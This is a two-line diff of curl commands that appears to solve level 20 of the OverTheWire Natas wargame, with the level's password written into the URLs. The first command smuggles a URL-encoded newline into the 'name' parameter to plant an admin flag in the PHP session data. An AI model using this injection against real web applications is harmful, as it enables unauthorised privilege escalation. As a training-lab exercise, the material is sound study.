@@ -1,0 +1,2 @@
+curl -X POST --cookie "PHPSESSID=iamnotahacker" http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201
+curl -X POST --cookie "PHPSESSID=iamnotahacker" http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org
